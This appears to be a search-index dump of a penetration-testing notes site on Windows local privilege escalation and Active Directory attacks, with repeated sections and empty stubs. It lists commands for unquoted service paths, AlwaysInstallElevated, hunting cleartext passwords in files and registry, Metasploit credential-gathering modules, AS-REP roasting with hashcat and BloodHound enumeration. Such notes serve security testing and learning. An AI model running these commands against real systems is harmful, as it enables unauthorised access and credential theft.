Privesc folder in the Documents folder of your user: \\Documents\\WindowsPowerShell\\Modules\\Privesc\\ Here you can download it: https://github.com/PowerShellMafia/PowerSploit/tree/dev/Privesc In order to import the module the easiest is to do the following in a powershell shell: powershell.exe -Exec bypass import-module Privesc # Check that it worked get-command -Module Privesc Now you can either run all checks to check all privesc possibilities. Or just check weak services with: invoke-AllChecks Now check for the output from Services-delen. If you have a domain-user check for files where the usergroup NT/Authenticated users can write files. If youy user can't restart the service you will have to restart the machine.","title":"PowerSploit Privesc/PowerUp"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#3-unquoted-service-paths","text":"So the idea here is that if the path to a service binary/executable is (1) not surounded by quotation-marks (\"\"), and the and the attacker has write-permissions on The basic idea is to make a service execute a malicious binary when it is started. For this to work the following conditions must be met: 1. The UNC path must not be sourounded by quotes \"\". 2. The path must contain a space, for example \\windows\\my files\\test.exe . 3. The attacker must have write-permissions the directory with space in the name. So in the case it must have write permissions in \\my files\\ . The PATH to the service binary is set in the registry.","title":"3. Unquoted Service Paths"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#exploit-with-powersploit","text":"Get-UnquotedService","title":"Exploit with PowerSploit"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#manually_2","text":"Find Services With Unquoted Paths # Using WMIC wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\" # Using sc sc query sc qc service name # Look for Binary_path_name and see if it is unquoted. If the path contains a space and is not quoted, the service is vulnerable. Exploit It If the path to the binary is: c:\\Program Files\\something\\winamp.exe We can place a binary like this c:\\program.exe When the program is restarted it will execute the binary program.exe , which we of course control. We can do this in any directory that has a space in its name. Not only program files . This attack is explained here: http://toshellandback.com/2015/11/24/ms-priv-esc/ There is also a metasploit module for this is: exploit/windows/local/trusted_service_path","title":"Manually"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#4-alwaysinstallelevated-install-new-program-as-privileged-user","text":"This is a pretty simple privilege escalation attack. If this registry key is set a user is able to install any program. And when it is installed, it is installed as administrator. This means that if the attacker creates a install-package, .msi file, and then clicks on it, the package will be installed by the administrator/NT Authority. So if the attacker creates a install-package that adds a new privilege user the new user will be created. Check to see if the registry key is set: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated Or reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated http://toshellandback.com/2015/11/24/ms-priv-esc/ Exploit it using PowerUp.ps1 Write-UserAddMSI This will create an isntallation-file on the desktop. Once you click that you get a dialog where you can enter the new user and password you would like to create. It then gets created when you continue the installation.","title":"4. AlwaysInstallElevated - Install new program as privileged user"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#5-dll-hijacking","text":"First check what services are running. Second, check if those services are running as LocalSystem. Third, check that the service is not a windows default service. Fourth, check if you have any directory in the PATH variable that you have write-permissions to. Now that you have enumerated the custom services that are running we need to find out if they load any DLL:s that doesn't exist.","title":"5. DLL Hijacking"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#run-it-locally","text":"One way is to install the program locally on a computer where you are Administrator. You can run procmon at the same time, so that you can check what DLL:s it is trying to load.","title":"Run it locally"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#check-the-executable-and-check-for-loadlibrary-functions","text":"I have never tried this tool, so who knows. There is a tool for this: https://github.com/Cybereason/siofra Otherwise you can maybe search for strings in the binary, take all the DLL:s that you find that it is invoking. Whether it exists or not. And then you create a malicios DLL and copy it to every name of the files you find when you searched for strings in the binary. No good method for it if you can't use Procmon. Read this https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/","title":"Check the executable and check for LoadLibrary functions."},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#6-check-installed-software-for-exploits","text":"Check what programs are installed on the machine, and google to to see if any of them contains local privilege escalations.","title":"6. Check installed software for exploits"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#7-cleartext-passwords-stored-credentials","text":"","title":"7. Cleartext Passwords / Stored credentials"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#search-for-them","text":"findstr /si password *.txt findstr /si password *.xml findstr /si password *.ini #Find all those strings in config files. dir /s *pass* == *cred* == *vnc* == *.config* # Find all passwords in all files. findstr /spin \"password\" *.* findstr /spin \"password\" *.*","title":"Search for them"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#in-common-files","text":"These are common files to find them in. They might be base64-encoded. So look out for that. c:\\sysprep.inf c:\\sysprep\\sysprep.xml c:\\unattend.xml %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml dir c:\\*vnc.ini /s /b dir c:\\*ultravnc.ini /s /b dir c:\\ /s /b | findstr /si *vnc.ini","title":"In Common Files"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#in-registry","text":"# VNC reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" # Windows autologin reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" # SNMP Paramters reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" # Putty reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" # Search for password in registry reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s","title":"In Registry"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#check-browser-creds","text":"So if you gotten access to a machine as another user. You can check to see if that user has stored credentials in the browser. USe the following metasploit module: run post/windows/gather/enum_chrome run post/multi/gather/firefox_creds","title":"Check browser creds"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#8-kernel-exploits","text":"Kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine. Identify the hotfixes/patches systeminfo # or wmic qfe get Caption,Description,HotFixID,InstalledOn Python to Binary If we have an exploit written in python but we don't have python installed on the victim-machine we can always transform it into a binary with pyinstaller. Good trick to know.","title":"8. Kernel exploits"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#service-only-available-from-inside","text":"Sometimes there are services that are only accessible from inside the network. For example a MySQL server might not be accessible from the outside, for security reasons. It is also common to have different administration applications that is only accessible from inside the network/machine. Like a printer interface, or something like that. These services might be more vulnerable since they are not meant to be seen from the outside. netstat -ano Example output: Proto Local address Remote address State User Inode PID/Program name ----- ------------- -------------- ----- ---- ----- ---------------- tcp 0.0.0.0:21 0.0.0.0:* LISTEN 0 0 - tcp 0.0.0.0:5900 0.0.0.0:* LISTEN 0 0 - tcp 0.0.0.0:6532 0.0.0.0:* LISTEN 0 0 - tcp 192.168.1.9:139 0.0.0.0:* LISTEN 0 0 - tcp 192.168.1.9:139 192.168.1.9:32874 TIME_WAIT 0 0 - tcp 192.168.1.9:445 192.168.1.9:40648 ESTABLISHED 0 0 - tcp 192.168.1.9:1166 192.168.1.9:139 TIME_WAIT 0 0 - tcp 192.168.1.9:27900 0.0.0.0:* LISTEN 0 0 - tcp 127.0.0.1:445 127.0.0.1:1159 ESTABLISHED 0 0 - tcp 127.0.0.1:27900 0.0.0.0:* LISTEN 0 0 - udp 0.0.0.0:135 0.0.0.0:* 0 0 - udp 192.168.1.9:500 0.0.0.0:* 0 0 - Look for LISTENING/LISTEN . Compare that to the scan you did from the outside. Does it contain any ports that are not accessible from the outside? If that is the case, maybe you can make a remote forward to access it. # Port forward using plink plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080 # Port forward using meterpreter portfwd add -l <attacker port> -p <victim port> -r <victim ip> portfwd add -l 3306 -p 3306 -r 192.168.1.101 So how should we interpret the netstat output? Local address 0.0.0.0 Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface. This means that anyone can connect to it. Local address 127.0.0.1 Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. This is interesting to us! Local address 192.168.1.9 Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. This is also interesting to us!","title":"Service only available from inside"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#vulnerable-drivers","text":"Some driver might be vulnerable. I don't know how to check this in an efficient way. # List all drivers driverquery","title":"Vulnerable Drivers"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#hot-potato","text":"Never tried. https://foxglovesecurity.com/2016/01/16/hot-potato/","title":"Hot potato"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#scheduled-tasks-only-works-on-windows-2000xp2003","text":"Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite. schtasks /query /fo LIST /v This might produce a huge amount of text. I have not been able to figure out how to just output the relevant strings with findstr . So if you know a better way please notify me. As for now I just copy-paste the text and past it into my linux-terminal. Yeah I know this ain't pretty, but it works. You can of course change the name SYSTEM to another privileged user. cat schtask.txt | grep \"SYSTEM\\|Task To Run\" | grep -B 1 SYSTEM","title":"Scheduled Tasks - Only works on Windows 2000/xp/2003"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#escalate-to-system-from-administrator","text":"","title":"Escalate to SYSTEM from Administrator"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#on-windows-xp-and-older","text":"If you have a GUI with a user that is included in Administrators group you first need to open up cmd.exe for the administrator. If you open up the cmd that is in Accessories it will be opened up as a normal user. And if you rightclick and do Run as Administrator you might need to know the Administrators password. Which you might not know. So instead you open up the cmd from c:\\windows\\system32\\cmd.exe . This will give you a cmd with Administrators rights. From here we want to become SYSTEM user. To do this we run: First we check what time it is on the local machine: time # Now we set the time we want the system CMD to start. Probably one minuter after the time. at 01:23 /interactive cmd.exe And then the cmd with SYSTEM privs pops up.","title":"On Windows XP and Older"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#vista-and-newer","text":"You first need to upload PsExec.exe and then you run: psexec -i -s cmd.exe","title":"Vista and Newer"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#kitrap","text":"On some machines the at 20:20 trick does not work. It never works on Windows 2003 for example. Instead you can use Kitrap. Upload both files and execute vdmaillowed.exe . I think it only works with GUI. vdmallowed.exe vdmexploit.dll","title":"Kitrap"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#using-metasploit_1","text":"So if you have a metasploit meterpreter session going you can run getsystem .","title":"Using Metasploit"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#post-modules","text":"Some interesting metasploit post-modules First you need to background the meterpreter shell and then you just run the post modules. You can also try some different post modules. use exploit/windows/local/service_permissions post/windows/gather/credentials/gpp run post/windows/gather/credential_collector run post/multi/recon/local_exploit_suggester run post/windows/gather/enum_shares run post/windows/gather/enum_snmp run post/windows/gather/enum_applications run post/windows/gather/enum_logged_on_users run post/windows/gather/checkvm","title":"Post modules"},{"location":"attacking_active_directory_domain/attacking_windows_domain_local_privilege_escalation/#references","text":"http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/ http://www.fuzzysecurity.com/tutorials/16.html https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/ http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html https://github.com/gentilkiwi/mimikatz http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html https://www.youtube.com/watch?v=kMG8IsCohHA&feature=youtu.be https://www.youtube.com/watch?v=PC_iMqiuIRQ http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/ https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp http://pwnwiki.io/#!privesc/windows/index.md","title":"References"},{"location":"attacking_active_directory_domain/domain_privilege_escalation_checklist/","text":"Active Directory Privilege Escalation Checklist # [ ] Kerberos TGS Service Ticket Cracking (Kerberoast) [ ] Excessive Amount of Domain Admins [ ] Incorrectly Configured Forest or Domain Trust [ ] Misconfigured Access Control Lists [ ] Password Spraying [ ] Passwords in Active Directory Attributes [ ] SMB Shares Mining [ ] Unsafe Usage of High Privileged Accounts [ ] NTLM Relaying and Theft [ ] Check for Local Admin Privileges [ ] Credential Extraction (LSASS/SAM) [ ] Check for Lockout Policy [ ] Check for misconfigured LAPS [ ] Check for writable executables on shares [ ] Abusing GPO [ ] ASEP Roasting [ ] Misconfigured SQL-server [ ] Get Passwords Stored in SYSVOL Group Policy Preference [ ] Check for scripts on DC SYSVOL [ ] Misconfigured read only domain controller [ ] LLMNR and NBT-NS Poisoning","title":"Domain Privilege Escalation Checklist"},{"location":"attacking_active_directory_domain/domain_privilege_escalation_checklist/#active-directory-privilege-escalation-checklist","text":"[ ] Kerberos TGS Service Ticket Cracking (Kerberoast) [ ] Excessive Amount of Domain Admins [ ] Incorrectly Configured Forest or Domain Trust [ ] Misconfigured Access Control Lists [ ] Password Spraying [ ] Passwords in Active Directory Attributes [ ] SMB Shares Mining [ ] Unsafe Usage of High Privileged Accounts [ ] NTLM Relaying and Theft [ ] Check for Local Admin Privileges [ ] Credential Extraction (LSASS/SAM) [ ] Check for Lockout Policy [ ] Check for misconfigured LAPS [ ] Check for writable executables on shares [ ] Abusing GPO [ ] ASEP Roasting [ ] Misconfigured SQL-server [ ] Get Passwords Stored in SYSVOL Group Policy Preference [ ] Check for scripts on DC SYSVOL [ ] Misconfigured read only domain controller [ ] LLMNR and NBT-NS Poisoning","title":"Active Directory Privilege Escalation Checklist"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_constrained_delegation/","text":"Background # Pre-requisites # Risks # How to check for # How to exploit # Recommendation # Related Vulnerabilities # References # https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html","title":"Abusing Constrained Delegation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_constrained_delegation/#background","text":"","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_constrained_delegation/#pre-requisites","text":"","title":"Pre-requisites"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_constrained_delegation/#risks","text":"","title":"Risks"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_constrained_delegation/#how-to-check-for","text":"","title":"How to check for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_constrained_delegation/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_constrained_delegation/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_constrained_delegation/#related-vulnerabilities","text":"","title":"Related Vulnerabilities"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_constrained_delegation/#references","text":"https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html","title":"References"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_unconstrained_delegation/","text":"Background # Pre-requisites # Valid domain user. Risks # How to check for # Check for users that have unconstrained delegation. Default such users are the domain controllers machine account, in other words, the domain controller computer objects. The account needs to have UserAccountControl attribute set to TRUSTED_FOR_DELEGATION . If you use ADExplorer it might be a bit difficult to know if the user has this attribute set, because the attribute value is set as an integer. If you are able to compromise users that have unconstrained delegation MATCH (c:Computer {unconstraineddelegation:true}) return c With powerview you can check for computers accounts with unconstrained delegation like this: get-domaincomputer -unconstrained | select-object -property name,useraccountcontrol With PowerView you can check for users with unconstrained delegation like this: Get-DomainUser -ldapfilter \"(userAccountControl:1.2.840.113556.1.4.803:=524288)\" How to exploit # Recommendation # Related Vulnerabilities # References # https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/","title":"Abusing Unconstrained Delegation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_unconstrained_delegation/#background","text":"","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_unconstrained_delegation/#pre-requisites","text":"Valid domain user.","title":"Pre-requisites"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_unconstrained_delegation/#risks","text":"","title":"Risks"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_unconstrained_delegation/#how-to-check-for","text":"Check for users that have unconstrained delegation. Default such users are the domain controllers machine account, in other words, the domain controller computer objects. The account needs to have UserAccountControl attribute set to TRUSTED_FOR_DELEGATION . If you use ADExplorer it might be a bit difficult to know if the user has this attribute set, because the attribute value is set as an integer. If you are able to compromise users that have unconstrained delegation MATCH (c:Computer {unconstraineddelegation:true}) return c With powerview you can check for computers accounts with unconstrained delegation like this: get-domaincomputer -unconstrained | select-object -property name,useraccountcontrol With PowerView you can check for users with unconstrained delegation like this: Get-DomainUser -ldapfilter \"(userAccountControl:1.2.840.113556.1.4.803:=524288)\"","title":"How to check for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_unconstrained_delegation/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_unconstrained_delegation/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_unconstrained_delegation/#related-vulnerabilities","text":"","title":"Related Vulnerabilities"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/abusing_unconstrained_delegation/#references","text":"https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/","title":"References"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/aseproasting/","text":"Background # How to test for # MATCH (u:User {dontreqpreauth: true}) RETURN u python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file> How to exploit # hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file> Recommendation # Reference #","title":"AS-REP roasting"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/aseproasting/#background","text":"","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/aseproasting/#how-to-test-for","text":"MATCH (u:User {dontreqpreauth: true}) RETURN u python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>","title":"How to test for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/aseproasting/#how-to-exploit","text":"hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>","title":"How to exploit"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/aseproasting/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/aseproasting/#reference","text":"","title":"Reference"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_insecure_usage_of_high_privileged_accounts/","text":"Unsafe usage of high priviliged accounts # Authenticating with a high privileged account Background # Pre-requisites # Risks # How to check for # To collect sessions we can run Sharphound in a loop to gather new sessions. Collect new sessions every 10 minutes for 5 hours. invoke-bloodhound -CollectionMethod session -Loop -LoopInterval 00:10:00 -LoopDuration 05:00:00 After importing the Sharphound results to bloodhound we can run the following cypher-queryto see where admin-users have sessions. MATCH p=(c:Computer)-[r:HasSession]->(n:User {admincount : true}) RETURN p MATCH (c:Computer)-[r:HasSession]->(n:User {admincount : true}) RETURN n The result can be returned as a CSV-file. echo \"MATCH p=(c:Computer)-[r:HasSession]->(n:User {admincount : true}) RETURN n.name,c.name;\" | /usr/share/neo4j/bin/cypher-shell -u neo4j -p <NEO4jPASSWORD> --format plain > res.txt If you don't want to single out which users have used their admin-accounts in an insecure way you can just remove that. echo \"MATCH p=(c:Computer)-[r:HasSession]->(n:User {admincount : true}) RETURN n.name,c.name;\" | /usr/share/neo4j/bin/cypher-shell -u neo4j -p <NEO4jPASSWORD> --format plain > res.txt If you are using latex-utils you can do the following: echo \"MATCH p=(c:Computer)-[r:HasSession]->(n:User {admincount : true}) RETURN n.name,c.name;\" | /usr/share/neo4j/bin/cypher-shell -u neo4j -p <NEO4jPASSWORD> --format plain | latex-convert-csv How to exploit # Recommendation # Related Vulnerabilities # Insecure Usage of high privileged accounts References #","title":"Check for Insecure Usage of High Privileged Accounts"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_insecure_usage_of_high_privileged_accounts/#unsafe-usage-of-high-priviliged-accounts","text":"Authenticating with a high privileged account","title":"Unsafe usage of high priviliged accounts"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_insecure_usage_of_high_privileged_accounts/#background","text":"","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_insecure_usage_of_high_privileged_accounts/#pre-requisites","text":"","title":"Pre-requisites"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_insecure_usage_of_high_privileged_accounts/#risks","text":"","title":"Risks"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_insecure_usage_of_high_privileged_accounts/#how-to-check-for","text":"To collect sessions we can run Sharphound in a loop to gather new sessions. Collect new sessions every 10 minutes for 5 hours. invoke-bloodhound -CollectionMethod session -Loop -LoopInterval 00:10:00 -LoopDuration 05:00:00 After importing the Sharphound results to bloodhound we can run the following cypher-queryto see where admin-users have sessions. MATCH p=(c:Computer)-[r:HasSession]->(n:User {admincount : true}) RETURN p MATCH (c:Computer)-[r:HasSession]->(n:User {admincount : true}) RETURN n The result can be returned as a CSV-file. echo \"MATCH p=(c:Computer)-[r:HasSession]->(n:User {admincount : true}) RETURN n.name,c.name;\" | /usr/share/neo4j/bin/cypher-shell -u neo4j -p <NEO4jPASSWORD> --format plain > res.txt If you don't want to single out which users have used their admin-accounts in an insecure way you can just remove that. echo \"MATCH p=(c:Computer)-[r:HasSession]->(n:User {admincount : true}) RETURN n.name,c.name;\" | /usr/share/neo4j/bin/cypher-shell -u neo4j -p <NEO4jPASSWORD> --format plain > res.txt If you are using latex-utils you can do the following: echo \"MATCH p=(c:Computer)-[r:HasSession]->(n:User {admincount : true}) RETURN n.name,c.name;\" | /usr/share/neo4j/bin/cypher-shell -u neo4j -p <NEO4jPASSWORD> --format plain | latex-convert-csv","title":"How to check for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_insecure_usage_of_high_privileged_accounts/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_insecure_usage_of_high_privileged_accounts/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_insecure_usage_of_high_privileged_accounts/#related-vulnerabilities","text":"Insecure Usage of high privileged accounts","title":"Related Vulnerabilities"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_insecure_usage_of_high_privileged_accounts/#references","text":"","title":"References"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_local_admin_privileges/","text":"Background # Who is local administrator is configured in each domain-joined computer. It is therefore not possible to ask the DC for that information, instead it needs to be queries from each computer. The local group Administrators can contain domain groups. This can create unforseen complexity that accidentally adds users to the local Administrators group. A user who is local administrator on a hosts leverage this privilege in a number of different ways. It can, for example, be used to extract credentials from the lsass process (See Credential Extraction for how to perform that attack). Pre-requisites # Valid domain user. Risks # Only run in bloodhound, so no risks. How to check for # Using Bloodhound # For installing and running Bloodhound see Tools Bloodhound enumerates this information. To check where your user is local admin you can just search for your user and then click on it and check the information. For example: Local Admin Rights First Degree Local Admin 0 Group Delegated Local Admin Rights 3 Derivative Local Admin Rights 5 Find what groups have local admin rights MATCH p=(m:Group)-[r:AdminTo]->(n:Computer) RETURN m.name, n.name ORDER BY m.name Find what group has most local admin rights and list them in that order: MATCH p=(m:Group)-[r:AdminTo]->(n:Computer) RETURN m.name, count(m.name) ORDER BY count(m.name) desc Find what users have local admin rights, and on which computers: MATCH p=(m:User)-[r:AdminTo]->(n:Computer) RETURN m.name, n.name ORDER BY m.name Find how many users in total have local admin access to resource: MATCH p=(m:User)-[r:AdminTo]->(n:Computer) RETURN count(distinct m.name) Find the users that is local admin on most machines: MATCH p=(m:User)-[r:AdminTo]->(n:Computer) RETURN m.name, count(m.name) ORDER BY count(m.name) desc Check to see that there are no unresonable amount of groups and users that are local admins. Also check that the domain controllers Using PowerView # For installing and running PowerView see Tools Find-LocalAdminAccess Using Crackmapexec # How to exploit # Recommendation # Related Vulnerabilities # References #","title":"Check for Local Admin Privileges"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_local_admin_privileges/#background","text":"Who is local administrator is configured in each domain-joined computer. It is therefore not possible to ask the DC for that information, instead it needs to be queries from each computer. The local group Administrators can contain domain groups. This can create unforseen complexity that accidentally adds users to the local Administrators group. A user who is local administrator on a hosts leverage this privilege in a number of different ways. It can, for example, be used to extract credentials from the lsass process (See Credential Extraction for how to perform that attack).","title":"Background"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_local_admin_privileges/#pre-requisites","text":"Valid domain user.","title":"Pre-requisites"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_local_admin_privileges/#risks","text":"Only run in bloodhound, so no risks.","title":"Risks"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_local_admin_privileges/#how-to-check-for","text":"","title":"How to check for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_local_admin_privileges/#using-bloodhound","text":"For installing and running Bloodhound see Tools Bloodhound enumerates this information. To check where your user is local admin you can just search for your user and then click on it and check the information. For example: Local Admin Rights First Degree Local Admin 0 Group Delegated Local Admin Rights 3 Derivative Local Admin Rights 5 Find what groups have local admin rights MATCH p=(m:Group)-[r:AdminTo]->(n:Computer) RETURN m.name, n.name ORDER BY m.name Find what group has most local admin rights and list them in that order: MATCH p=(m:Group)-[r:AdminTo]->(n:Computer) RETURN m.name, count(m.name) ORDER BY count(m.name) desc Find what users have local admin rights, and on which computers: MATCH p=(m:User)-[r:AdminTo]->(n:Computer) RETURN m.name, n.name ORDER BY m.name Find how many users in total have local admin access to resource: MATCH p=(m:User)-[r:AdminTo]->(n:Computer) RETURN count(distinct m.name) Find the users that is local admin on most machines: MATCH p=(m:User)-[r:AdminTo]->(n:Computer) RETURN m.name, count(m.name) ORDER BY count(m.name) desc Check to see that there are no unresonable amount of groups and users that are local admins. Also check that the domain controllers","title":"Using Bloodhound"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_local_admin_privileges/#using-powerview","text":"For installing and running PowerView see Tools Find-LocalAdminAccess","title":"Using PowerView"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_local_admin_privileges/#using-crackmapexec","text":"","title":"Using Crackmapexec"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_local_admin_privileges/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_local_admin_privileges/#recommendation","text":"","title":"Recommendation"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_local_admin_privileges/#related-vulnerabilities","text":"","title":"Related Vulnerabilities"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_local_admin_privileges/#references","text":"","title":"References"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_lockout_threshold/","text":"Active Directory - Check for lockout threshold # Lockout threshold can be configured in a number of different ways. There are many caveats and risks involved with adding account lockout. In some configurations applications use user credentials to authenticate. So if the password is change on one device, the other devices/applications will continue with the old password, and therefore lock out the user. Account lockout policy is usually managed through GPOs. By default it is the \"Defaul Domain Policy\" that specifies the Lockout policy. Account Lockout Duration Account Lockout Threshold Reset account lockout after: Default is 30 min https://ravingroo.com/295/active-directory-account-lockout-policy-threshold-counter-strong-password/ How to test for # net accounts get-domainpolicy net accounts /domain","title":"Check for Lockout Policy"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_lockout_threshold/#active-directory-check-for-lockout-threshold","text":"Lockout threshold can be configured in a number of different ways. There are many caveats and risks involved with adding account lockout. In some configurations applications use user credentials to authenticate. So if the password is change on one device, the other devices/applications will continue with the old password, and therefore lock out the user. Account lockout policy is usually managed through GPOs. By default it is the \"Defaul Domain Policy\" that specifies the Lockout policy. Account Lockout Duration Account Lockout Threshold Reset account lockout after: Default is 30 min https://ravingroo.com/295/active-directory-account-lockout-policy-threshold-counter-strong-password/","title":"Active Directory - Check for lockout threshold"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_lockout_threshold/#how-to-test-for","text":"net accounts get-domainpolicy net accounts /domain","title":"How to test for"},{"location":"attacking_active_directory_domain/active_directory_privilege_escalation/check_for_misconfgured_access_control_of_mssql/","text":"Background # Sometimes sql-servers are integrated into domain, and sometimes normal domain-users are allowed to authenticate to the sql-server. This can allow low priviliged users to gain access to sensitive data, and can also allow the user in some circumstances to be able to execute commands on the server. It might also be possible to force the domain user that is running the database instance to authenticate. Pre-requisites # Valid domain user Risks # How to check for # You can enumerate SQL instances using PowerUpSQL. get-sqlinstancedomain -verbose However, these are based on SPNs that includes MSSQL. So there might be a lot of false positives here. For example old computer objects that doesn't really exist anymore. You can get a list of all hosts like this: get-sqlinstancedomain -verbose | select-object -property ComputerName Check if your current user can authenticate to the identified mssql instance $Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object 